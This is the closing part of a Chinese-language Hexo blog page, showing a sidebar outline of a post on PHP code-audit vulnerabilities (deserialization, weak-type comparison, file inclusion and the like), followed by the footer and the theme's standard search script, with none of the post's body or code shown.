nav-level-4"><a class="nav-link" href="#file"><span class="nav-text">file()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#parse-ini-file"><span class="nav-text">parse_ini_file()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#show-source-highlight-file"><span class="nav-text">show_source()&#x2F;highlight_file()</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#文件上传"><span class="nav-text">文件上传</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#move-uploaded-file"><span class="nav-text">move_uploaded_file()</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#文件删除"><span class="nav-text">文件删除</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#unlink"><span class="nav-text">unlink()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#session-destroy"><span class="nav-text">session_destroy()</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#变量覆盖"><span class="nav-text">变量覆盖</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#extract"><span class="nav-text">extract()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#parse-str"><span class="nav-text">parse_str()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#import-request-variables"><span class="nav-text">import_request_variables()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#foreach"><span class="nav-text">foreach()</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#弱类型比较"><span class="nav-text">弱类型比较</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#md5-函数和sha1-绕过"><span class="nav-text">md5()函数和sha1()绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#is-numeric-绕过"><span class="nav-text">is_numeric()绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#in-array-绕过"><span class="nav-text">in_array()绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#参数"><span class="nav-text">参数</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XSS"><span class="nav-text">XSS</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#print"><span class="nav-text">print()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#echo"><span class="nav-text">echo()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#printf"><span class="nav-text">printf()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#sprintf"><span class="nav-text">sprintf()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#die"><span class="nav-text">die()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#var-dump"><span class="nav-text">var_dump()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#var-export"><span class="nav-text">var_export()</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PHP黑魔法"><span class="nav-text">PHP黑魔法</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#md5"><span class="nav-text">md5()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#eval-1"><span class="nav-text">eval()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ereg"><span class="nav-text">ereg()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#strcmp"><span class="nav-text">strcmp()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#curl-setopt"><span class="nav-text">curl_setopt()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#preg-replace-1"><span class="nav-text">preg_replace()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#urldecode"><span class="nav-text">urldecode()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#file-get-contents-1"><span class="nav-text">file_get_contents()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#parse-url"><span class="nav-text">parse_url()</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#反序列化漏洞"><span class="nav-text">反序列化漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#wakeup"><span class="nav-text">__wakeup()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#sleep"><span class="nav-text">__sleep()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#destruct"><span class="nav-text">__destruct()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#construct"><span class="nav-text">__construct()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#call"><span class="nav-text">__call()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#callStatic"><span class="nav-text">__callStatic()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#get"><span class="nav-text">__get()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#set"><span class="nav-text">__set()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#isset"><span class="nav-text">__isset()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#unset"><span class="nav-text">__unset()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#toString-NaN"><span class="nav-text">toString()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#invoke"><span class="nav-text">__invoke()</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pop链的构造"><span class="nav-text">pop链的构造</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#思路"><span class="nav-text">思路</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#phar与反序列化"><span class="nav-text">phar与反序列化</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#实验"><span class="nav-text">实验</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#其他一些总结"><span class="nav-text">其他一些总结</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#basename"><span class="nav-text">basename()</span></a></li></ol></li></ol></li></ol></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">joker0xxx3</span>

  
</div>

<!-- 

  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>

-->



        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
          <span id="scrollpercent"><span>0</span>%</span>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  


  











  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  

  
  
    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  

  <script type="text/javascript">
    // Popup Window;
    var isfetched = false;
    var isXml = true;
    // Search DB path;
    var search_path = "search.xml";
    if (search_path.length === 0) {
      search_path = "search.xml";
    } else if (/json$/i.test(search_path)) {
      isXml = false;
    }
    var path = "/" + search_path;
    // monitor main search box;

    var onPopupClose = function (e) {
      $('.popup').hide();
      $('#local-search-input').val('');
      $('.search-result-list').remove();
      $('#no-result').remove();
      $(".local-search-pop-overlay").remove();
      $('body').css('overflow', '');
    }

    function proceedsearch() {
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
        .css('overflow', 'hidden');
      $('.search-popup-overlay').click(onPopupClose);
      $('.popup').toggle();
      var $localSearchInput = $('#local-search-input');
      $localSearchInput.attr("autocapitalize", "none");
      $localSearchInput.attr("autocorrect", "off");
      $localSearchInput.focus();
    }

    // search function;
    var searchFunc = function(path, search_id, content_id) {
      'use strict';

      // start loading animation
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
          '<div id="search-loading-icon">' +
          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
          '</div>' +
          '</div>')
        .css('overflow', 'hidden');
      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');

      $.ajax({
        url: path,
        dataType: isXml ? "xml" : "json",
        async: true,
        success: function(res) {
          // get the contents from search data
          isfetched = true;
          $('.popup').detach().appendTo('.header-inner');
          var datas = isXml ? $("entry", res).map(function() {
            return {
              title: $("title", this).text(),
              content: $("content",this).text(),
              url: $("url" , this).text()
            };
          }).get() : res;
          var input = document.getElementById(search_id);
          var resultContent = document.getElementById(content_id);
          var inputEventFunction = function() {
            var searchText = input.value.trim().toLowerCase();
            var keywords = searchText.split(/[\s\-]+/);
            if (keywords.length > 1) {
              keywords.push(searchText);
            }
            var resultItems = [];
            if (searchText.length > 0) {
              // perform local searching
              datas.forEach(function(data) {
                var isMatch = false;
                var hitCount = 0;
                var searchTextCount = 0;
                var title = data.title.trim();
                var titleInLowerCase = title.toLowerCase();
                var content = data.content.trim().replace(/<[^>]+>/g,"");
                var contentInLowerCase = content.toLowerCase();
                var articleUrl = decodeURIComponent(data.url);
                var indexOfTitle = [];
                var indexOfContent = [];
                // only match articles with not empty titles
                if(title != '') {
                  keywords.forEach(function(keyword) {
                    function getIndexByWord(word, text, caseSensitive) {
                      var wordLen = word.length;
                      if (wordLen === 0) {
                        return [];
                      }
                      var startPosition = 0, position = [], index = [];
                      if (!caseSensitive) {
                        text = text.toLowerCase();
                        word = word.toLowerCase();
                      }
                      while ((position = text.indexOf(word, startPosition)) > -1) {
                        index.push({position: position, word: word});
                        startPosition = position + wordLen;
                      }
                      return index;
                    }

                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
                  });
                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
                    isMatch = true;
                    hitCount = indexOfTitle.length + indexOfContent.length;
                  }
                }

                // show search results

                if (isMatch) {
                  // sort index by position of keyword

                  [indexOfTitle, indexOfContent].forEach(function (index) {
                    index.sort(function (itemLeft, itemRight) {
                      if (itemRight.position !== itemLeft.position) {
                        return itemRight.position - itemLeft.position;
                      } else {
                        return itemLeft.word.length - itemRight.word.length;
                      }
                    });
                  });

                  // merge hits into slices

                  function mergeIntoSlice(text, start, end, index) {
                    var item = index[index.length - 1];
                    var position = item.position;
                    var word = item.word;
                    var hits = [];
                    var searchTextCountInSlice = 0;
                    while (position + word.length <= end && index.length != 0) {
                      if (word === searchText) {
                        searchTextCountInSlice++;
                      }
                      hits.push({position: position, length: word.length});
                      var wordEnd = position + word.length;

                      // move to next position of hit

                      index.pop();
                      while (index.length != 0) {
                        item = index[index.length - 1];
                        position = item.position;
                        word = item.word;
                        if (wordEnd > position) {
                          index.pop();
                        } else {
                          break;
                        }
                      }
                    }
                    searchTextCount += searchTextCountInSlice;
                    return {
                      hits: hits,
                      start: start,
                      end: end,
                      searchTextCount: searchTextCountInSlice
                    };
                  }

                  var slicesOfTitle = [];
                  if (indexOfTitle.length != 0) {
                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
                  }

                  var slicesOfContent = [];
                  while (indexOfContent.length != 0) {
                    var item = indexOfContent[indexOfContent.length - 1];
                    var position = item.position;
                    var word = item.word;
                    // cut out 100 characters
                    var start = position - 20;
                    var end = position + 80;
                    if(start < 0){
                      start = 0;
                    }
                    if (end < position + word.length) {
                      end = position + word.length;
                    }
                    if(end > content.length){
                      end = content.length;
                    }
                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
                  }

                  // sort slices in content by search text's count and hits' count

                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
                      return sliceRight.hits.length - sliceLeft.hits.length;
                    } else {
                      return sliceLeft.start - sliceRight.start;
                    }
                  });

                  // select top N slices in content

                  var upperBound = parseInt('1');
                  if (upperBound >= 0) {
                    slicesOfContent = slicesOfContent.slice(0, upperBound);
                  }

                  // highlight title and content

                  function highlightKeyword(text, slice) {
                    var result = '';
                    var prevEnd = slice.start;
                    slice.hits.forEach(function (hit) {
                      result += text.substring(prevEnd, hit.position);
                      var end = hit.position + hit.length;
                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
                      prevEnd = end;
                    });
                    result += text.substring(prevEnd, slice.end);
                    return result;
                  }

                  var resultItem = '';

                  if (slicesOfTitle.length != 0) {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
                  } else {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
                  }

                  slicesOfContent.forEach(function (slice) {
                    resultItem += "<a href='" + articleUrl + "'>" +
                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
                      "...</p>" + "</a>";
                  });

                  resultItem += "</li>";
                  resultItems.push({
                    item: resultItem,
                    searchTextCount: searchTextCount,
                    hitCount: hitCount,
                    id: resultItems.length
                  });
                }
              })
            };
            if (keywords.length === 1 && keywords[0] === "") {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
            } else if (resultItems.length === 0) {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
            } else {
              resultItems.sort(function (resultLeft, resultRight) {
                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
                  return resultRight.searchTextCount - resultLeft.searchTextCount;
                } else if (resultLeft.hitCount !== resultRight.hitCount) {
                  return resultRight.hitCount - resultLeft.hitCount;
                } else {
                  return resultRight.id - resultLeft.id;
                }
              });
              var searchResultList = '<ul class=\"search-result-list\">';
              resultItems.forEach(function (result) {
                searchResultList += result.item;
              })
              searchResultList += "</ul>";
              resultContent.innerHTML = searchResultList;
            }
          }

          if ('auto' === 'auto') {
            input.addEventListener('input', inputEventFunction);
          } else {
            $('.search-icon').click(inputEventFunction);
            input.addEventListener('keypress', function (event) {
              if (event.keyCode === 13) {
                inputEventFunction();
              }
            });
          }

          // remove loading animation
          $(".local-search-pop-overlay").remove();
          $('body').css('overflow', '');

          proceedsearch();
        }
      });
    }

    // handle and trigger popup window;
    $('.popup-trigger').click(function(e) {
      e.stopPropagation();
      if (isfetched === false) {
        searchFunc(path, 'local-search-input', 'local-search-result');
      } else {
        proceedsearch();
      };
    });

    $('.popup-btn-close').click(onPopupClose);
    $('.popup').click(function(e){
      e.stopPropagation();
    });
    $(document).on('keyup', function (event) {
      var shouldDismissSearchPopup = event.which === 27 &&
        $('.search-popup').is(':visible');
      if (shouldDismissSearchPopup) {
        onPopupClose();
      }
    });
  </script>





  

  

  

  
  

  

  

  

</body>
</html>
<!-- 页面点击小红心 -->
<script type="text/javascript" src="/js/src/clicklove.js"></script>
